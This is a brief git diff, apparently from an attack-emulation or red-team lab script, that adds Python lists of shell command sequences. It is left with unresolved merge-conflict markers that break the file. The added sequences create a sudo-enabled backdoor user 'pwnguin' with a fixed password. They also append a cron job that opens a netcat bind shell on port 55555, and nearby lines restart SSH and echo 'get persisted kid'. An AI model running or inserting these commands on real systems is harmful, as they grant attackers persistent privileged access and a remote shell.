@@ -4,6 +4,7 @@ SEQUENCE_0 = ["whoami",
               "sudo -i",
               "whoami"]
 
+<<<<<<< Updated upstream
 SEQUENCE_1 = []
 
 SEQUENCE_3 = [
@@ -19,3 +20,17 @@ SEQUENCE_3 = [
         "/etc/init.d/ssh restart",
         "echo get persisted kid",
     ]
+=======
+SEQUENCE_1 = ["whoami",
+              "sudo -l",
+              "sudo useradd pwnguin",
+              "echo pwnguin:pwnguin | chpasswd",
+              "sudo usermod -aG sudo pwnguin",
+              "sudo su pwnguin",
+              "touch pwnguined"]
+
+SEQUENCE_2 = ["whoami",
+              "cat /etc/crontab",
+              "sudo echo '10 14 * * *   vagrant     nc -l -p 55555 -e /bin/bash' >> /etc/crontab",
+              "cat /etc/crontab"]
+>>>>>>> Stashed changes
